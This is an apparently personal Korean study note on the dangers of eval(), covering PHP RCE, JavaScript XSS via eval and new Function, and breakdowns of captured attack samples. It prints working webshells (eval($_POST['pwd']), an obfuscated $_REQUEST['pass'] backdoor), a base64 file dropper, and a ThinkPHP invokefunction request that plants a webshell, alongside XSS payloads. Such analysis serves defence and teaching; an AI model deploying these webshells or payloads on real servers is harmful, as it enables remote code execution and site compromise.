## **🔍 `eval()`의 위험성 및 분류**

### **`eval()`이란?**

`eval()`은 주어진 문자열을 코드로 실행하는 함수입니다. 주로 **PHP**, **JavaScript** 같은 언어에서 사용되며, 서버나 클라이언트에서 동적으로 코드를 실행할 수 있게 해 줍니다. 하지만 **악용될 경우** 보안에 심각한 문제를 일으킬 수 있습니다.

| 용어                              | 설명                                                        |
| ------------------------------- | --------------------------------------------------------- |
| **XSS (Cross-Site Scripting)**  | 자바스크립트 코드가 브라우저에서 실행됨                                     |
| **RCE (Remote Code Execution)** | 서버 측에서 임의의 코드가 실행됨                                        |
| **eval()**                      | 브라우저에서도 쓰이고, PHP 같은 서버언어에서도 쓰이는 **실행 함수**                 |
| **Attribute Injection**         | HTML 속성(attribute)에 악성 코드가 삽입됨 (ex: `onerror="alert(1)"`) |

---

### **📡 서버 측에서 `eval()` → RCE (Remote Code Execution)** (PHP, Node.js 등)

`eval()`을 **서버 측**에서 사용하면 **Remote Code Execution (RCE)** 공격에 취약해질 수 있습니다. 서버에서 실행되는 코드가 외부 입력에 의존하게 되면, 공격자는 **서버에서 임의의 코드를 실행**할 수 있습니다.


```php
eval($_GET['cmd']);  // 위험한 RCE
```

* 이 코드는 사용자가 HTTP 요청으로 `cmd` 파라미터를 보내면, 그 값을 코드로 실행합니다.
* 예를 들어, `http://example.com/?cmd=ls`와 같은 요청이 들어오면, 서버에서 **`ls` 명령어**가 실행됩니다. 이는 **XSS가 아니라 RCE** 공격입니다.

#### **이중 인코딩된 웹쉘**:

```php
eval(base64_decode('...'));
```

* \*\*`base64`\*\*로 인코딩된 코드를 **디코딩**하여 실행하는 예시입니다. 디코딩된 코드는 웹쉘일 가능성이 높습니다.
* 이 방식은 웹쉘을 숨기고 우회하는 데 자주 사용됩니다.
* 시나리오는 다음과 같습니다.
  
| 항목     | 내용                                              |
| ------ | ----------------------------------------------- |
| **목적** | 서버에 `baker.php`라는 파일 생성                         |
| **내용** | `baker.php` 안에 **base64 인코딩된 PHP 코드** 삽입        |
| **기능** | `eval()`, `base64_decode()` 이용한 원격 명령 실행 백도어 설치 |
| **결과** | 공격자가 `baker.php?pass=...`와 같은 요청으로 **명령 실행 가능** |

---

### **🌐 클라이언트 측 HTML에서 `eval()` → XSS (Cross-Site Scripting)**

클라이언트 측에서는 `eval()`을 악용하여 **XSS** 공격을 할 수 있습니다.

```html
<script>
eval(location.hash.slice(1)); // location.hash에 따라 JS 실행
</script>
```

* 이 코드는 사용자가 **URL의 해시값**을 `eval()`을 통해 실행하게 합니다.
* **URL의 해시값 (hash value)**은 URL의 # 뒤에 오는 부분을 의미합니다. 보통 웹 페이지 내에서 특정 위치나 요소로 **"이동"**하거나, 상태를 추적하는 데 사용합니다.
* 예를 들어, `#alert(1)`을 URL에 추가하면 `alert(1)`이 실행됩니다.
* 이는 **XSS** 공격으로, 사용자가 의도하지 않은 자바스크립트가 실행됩니다.

---

### **✒️ Attribute Injection으로의 활용**

만약 `eval()`이 **HTML 속성**에 삽입된다면, **Attribute Injection** 형태로 XSS 공격이 발생할 수 있습니다. 이는 HTML 태그 내 속성에 악성 코드를 삽입하는 공격입니다.

```html
<img src="x" onerror="eval(alert('XSS'))">
```

* 위 코드에서 `eval()`은 `<img>` 태그의 `onerror` 속성에 삽입되어 있습니다.
* 사용자가 이미지를 로드하지 못했을 때 (에러가 발생하면) `eval(alert('XSS'))`가 실행됩니다.
* 이 경우는 **Attribute Injection**을 통한 **XSS** 공격입니다.

> **Attribute Injection**은 **HTML 속성에 코드가 삽입되는 경우**에 해당합니다. 즉, `eval()`이 사용되더라도 위치에 따라 XSS의 **하위 유형**으로 분류될 수 있습니다.


---

### ✅`eval()`과 `new Function()`을 통한 동적 코드 실행 (XSS)

`eval()`과 `new Function()`은 JavaScript에서 **동적 코드 실행**을 가능하게 하는 기능입니다.

#### 1. **`eval()`을 사용한 XSS 공격**

`eval()`은 문자열을 코드로 실행할 수 있는 기능을 제공합니다. 만약 `eval()`이 사용자 입력을 처리하는 코드에 포함되어 있다면, 악의적인 사용자가 해당 입력을 **JavaScript 코드**로 실행시킬 수 있습니다.

##### 예시:

만약 웹 애플리케이션이 URL 쿼리 매개변수 또는 사용자 입력을 `eval()`로 처리한다고 가정할 때, 공격자는 다음과 같은 **악성 페이로드**를 삽입할 수 있습니다.

```javascript
// 사용자 입력을 eval()로 실행하는 코드
var userInput = "alert('XSS Attack!');";  // 실제 공격자가 입력한 값
eval(userInput);
```

**악의적인 입력**:

```plaintext
javascript:alert('XSS'); // URL에서 사용될 수 있음
```

위와 같은 입력이 실행되면 **알림창**(`alert`)이 나타나는데, 이는 공격자가 **자바스크립트 코드**를 실행하게 만든 것입니다.

#### 2. **`new Function()`을 사용한 XSS 공격**

`new Function()`은 동적으로 **JavaScript 함수를 생성**하고, 이를 **실행**하는 방식입니다. 이 또한 **동적 코드 실행**을 가능하게 하여 XSS 공격에 취약할 수 있습니다.

##### 예시:

```javascript
// 사용자 입력을 new Function()으로 실행하는 코드
var userInput = "alert('XSS Attack!');";  // 실제 공격자가 입력한 값
var maliciousFunc = new Function(userInput);
maliciousFunc();
```

**악의적인 입력**:

```plaintext
alert('XSS');  // 사용자 입력값으로 주입되는 악성 스크립트
```

#### 3. **URL을 통한 XSS 공격**

`eval()`이나 `new Function()`을 사용하는 웹 애플리케이션에서, **URL의 쿼리 파라미터**를 통해 악성 JavaScript 코드를 주입할 수 있습니다.

##### 예시:

웹 애플리케이션에서 `eval()`을 사용하여 URL의 쿼리 매개변수 값을 처리하는 코드가 있을 수 있습니다.

```javascript
var userInput = getParameterByName('input');  // URL에서 쿼리 파라미터 가져오기
eval(userInput);
```

* URL 쿼리 파라미터 `input`에 **악성 스크립트**가 포함되면, 이를 \*\*eval()\*\*을 통해 실행시킬 수 있습니다.

**악의적인 URL 예시**:

```plaintext
https://example.com/?input=alert('XSS');
```

위 URL에 접속하면 `eval()`이 `"alert('XSS')"`를 실행하여 **알림창**을 띄우는 결과가 발생합니다.

#### 4. **`document.location`을 통한 XSS**

만약 `eval()`이나 `new Function()`을 사용하여 **URL을 동적으로 처리**하고 있다면, 공격자는 `document.location`을 악용하여 자신이 원하는 JavaScript를 실행시킬 수 있습니다.

##### 예시:

```javascript
var userInput = document.location.hash.substring(1);  // URL 해시(#)에서 값 추출
eval(userInput);  // 동적으로 JavaScript 실행
```

**악의적인 URL 예시**:

```plaintext
https://example.com/#alert('XSS');
```

위 URL을 통해 `#alert('XSS')`가 실행되며, **XSS 공격**이 발생합니다.

---

## **📌 예시 코드 1: base64 디코딩 후 `eval()` 실행**

```php
eval(base64_decode('...'));
```

* 이 코드는 **base64로 인코딩된 코드**를 디코딩하여 실행합니다.
* **디코딩된 코드**는 웹쉘일 가능성이 높고, 이 방식은 **웹쉘 우회 기법**으로 자주 사용됩니다.

#### **디코딩된 코드 예시**:

```php
file_put_contents('baker.php', base64_decode('PD9waHAgY2xhcz0NFNDkzRjYYgeyBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJEh5NUY3...'))
```

* 위 코드는 \*\*`file_put_contents`\*\*를 사용하여 서버에 `baker.php` 파일을 생성하고, **다시 base64로 인코딩된 PHP 웹쉘**을 그 파일에 저장합니다.
* **웹쉘**을 서버에 설치하여 원격으로 명령을 실행할 수 있게 됩니다.

---

## **📌 예시 코드 2: 난독화된 PHP 코드와 `eval()`**

```php
<?php
class GcE493F6 {
    public function __construct($Hy5F7){
        @eval(.$Hy5F7.);
    }
}
new GcE493F6($_REQUEST['pass']);
echo error303;
?>
```

#### **코드 설명**:

| 줄                                     | 설명                                                      |
| ------------------------------------- | ------------------------------------------------------- |
| `class GcE493F6 { ... }`              | `GcE493F6`라는 클래스 정의 (이름은 무작위로 보이지만 난독화된 것)              |
| `public function __construct($Hy5F7)` | 클래스가 생성될 때 자동 실행되는 **생성자 함수**                           |
| `@eval(.$Hy5F7.);`                    | `$Hy5F7`에 들어온 문자열을 **PHP 코드로 실행** → `eval()` 사용         |
| `new GcE493F6($_REQUEST['pass']);`    | `$_REQUEST['pass']` 값으로 객체를 생성하며, **그 값이 곧 실행됨**        |
| `echo error303;`                      | 존재하지 않는 상수 `error303` 출력 → PHP Notice 또는 오류 유도 (종료 확인용) |

* \*\*`eval($_REQUEST['pass']);`\*\*는 사용자가 **HTTP 요청**으로 보낸 **문자열**을 PHP 코드처럼 실행하는 방식입니다. 이는 **XSS**나 **RCE** 공격의 가능성을 염두에 두고 취약점이 됩니다.

---

## **📌 예시 코드 3: 난독화된 PHP 코드와 `eval()`**

서버에 PHP 파일을 **쓰기/설치**해서 서버에서 임의 코드를 실행하게 하는 **서버측 원격 코드 실행(RCE) / 웹셸 설치** 시도

```
@eval(,http://land/index.php?s\=/Index/ hinkpp/invokefunction&function\�ll_user_func_array&vars[0]\=file_put_contents&vars[1][]\=index_bak.php&vars[1][]\=<?php @eval($_POST['pwd']);?>hellohello9527527
```
원문은 이스케이프/인코딩 문자가 섞여 있으므로, 사람이 읽기 쉬운 형태로 복원하면 다음과 같이 해석됩니다

```
@eval(,http://land/index.php?s=/Index/hinkpp/invokefunction
  &function=call_user_func_array
  &vars[0]=file_put_contents
  &vars[1][]=index_bak.php
  &vars[1][]=<?php @eval($_POST['pwd']);?>hellohello9527527
| GET | https://community.com/
```

* 실제로는 일부 철자(예: `hinkpp` — 아마 `thinkphp` 오타 또는 의도적 변형), 제어문자(`\=` 같은 이스케이프)나 문자 깨짐이 섞여 있습니다.
* 공격의 핵심은 `function=call_user_func_array` 와 `vars[...]` 인자를 통해 **임의 함수 호출**(여기서는 `file_put_contents`)을 시도하는 점입니다.



### `@eval(`

* `@` : PHP에서 에러 억제 연산자. 에러/경고 메시지 출력을 숨깁니다. 공격자가 실패 로그를 숨기려 사용.
* `eval` : PHP 코드 문자열을 실행하는 함수. 매우 위험. (여기서는 문자열의 일부로 들어간 듯 — 전체 맥락에서 `@eval` 직접 호출 목적일 수도 있음)

> 결론: 공격자는 에러 숨기기와 동적 코드 실행을 염두에 둡니다.


### `http://land/index.php?s=/Index/hinkpp/invokefunction`

* 이 부분은 공격이 향하는 **대상 URL / 엔드포인트**입니다.
* `s=/Index/hinkpp/invokefunction` : 프레임워크 라우팅 파라미터로 보임. ThinkPHP 계열에서 `s` 파라미터로 컨트롤러/액션을 지정하는 패턴이 자주 사용됩니다.

  * `invokefunction` : 이름에서 알 수 있듯 **함수 호출을 리모트로 수행**하도록 만든 취약 기능(또는 취약한 디버그 엔드포인트)을 노린 것일 가능성이 큽니다.
  * `hinkpp` 는 `thinkphp` 오타 또는 우회 문자열일 수 있습니다(공격자는 종종 버전 차이나 필터를 피하려 철자변형 사용).

> 결론: 공격자는 특정 프레임워크/버전의 취약점을 노려 원격 함수 호출을 시도합니다.


### `&function=call_user_func_array`

* `call_user_func_array` 는 PHP 내장 함수로, 첫 인자로 전달된 함수명을 호출하고 두번째 인자로 인자 배열을 전달합니다.

  * 예: `call_user_func_array('f', ['a','b'])` → `f('a','b')`
* 이 파라미터가 외부 입력으로 서버에 전달되어 검증 없이 사용된다면, 공격자는 **임의의 PHP 함수 호출**이 가능합니다.

> 결론: 공격의 핵심—공격자는 이를 통해 서버에서 원하는 PHP 함수를 실행하려 함 (`file_put_contents` 등).


### `&vars[0]=file_put_contents`

* `vars` 는 `call_user_func_array`에 전달될 인자 배열을 구성합니다.
* `vars[0] = file_put_contents` → 호출할 함수 이름(또는 호출 대상)이 `file_put_contents` 로 설정됩니다.

  * 즉 `call_user_func_array`가 실제로는 `file_put_contents( ... )` 를 실행하도록 만들려는 의도입니다.

> 결론: 공격자는 서버에 파일을 쓰기(create/overwrite)하려 합니다.


### `&vars[1][]=index_bak.php`

* `vars[1][]` 는 `file_put_contents`에 전달될 첫번째 인자(파일명)입니다.
* `index_bak.php` 라는 파일을 **웹 루트** 또는 현재 작업 디렉토리에 생성/덮어쓰려 함.

> 결론: 생성될 파일명(백업·웹셸용 이름). 공격자는 흔히 `*_bak.php`, `tmp.php` 같은 이름을 씁니다.


### `&vars[1][]=<?php @eval($_POST['pwd']);?>hellohello9527527`

* `vars[1][]` 의 두번째 요소(내용). 즉 `file_put_contents('index_bak.php', '<contents>')`
* 실제 내용은:

  * `<?php @eval($_POST['pwd']);?>` : 전형적인 **웹셸**. POST 파라미터 `pwd` 로 받은 값을 `eval`로 실행시키는 백도어.

    * 공격자는 HTTP POST로 PHP 코드를 보내 원격에서 명령 실행 가능.
  * `hellohello9527527` : 보통은 **마커(marker)** 또는 탐지 우회용 추가 텍스트(검사/식별을 위한 시그니처) — 나중에 존재 여부로 성공 여부 확인 가능.

> 결론: 서버에 웹셸을 생성해 원격 명령 실행을 얻으려는 목적이 명확.


### `| GET | https://community.com/`

* 로그 형식으로 보이는 부분:

  * 요청 방식: `GET`
  * 요청 호스트/리퍼러 등: `https://community.com/`
* 공격자는 이 GET 요청으로 취약 엔드포인트에 위 파라미터들을 전달해 `file_put_contents`를 실행시키려 함.

> 결론: GET으로 전송된 파라미터만으로 `file_put_contents` 호출이 가능하다면 즉시 RCE/웹셸 설치 성공 위험.


# 실제 공격 흐름

1. 공격자가 `https://community.com/index.php?s=/Index/.../invokefunction`에 쿼리 파라미터로 `function=call_user_func_array` 와 `vars[...]` 를 보냄.
2. 취약한 서버 코드가 `function`/`vars`를 검증 없이 사용하여 `call_user_func_array`를 호출.
3. 결과적으로 `file_put_contents('index_bak.php', '<?php @eval($_POST['pwd']);?>hellohello9527527')`가 실행되어 파일이 생성됨.
4. 공격자는 이후 `POST /index_bak.php` 에 `pwd` 파라미터에 임의 PHP 코드를 담아 원격으로 코드 실행.





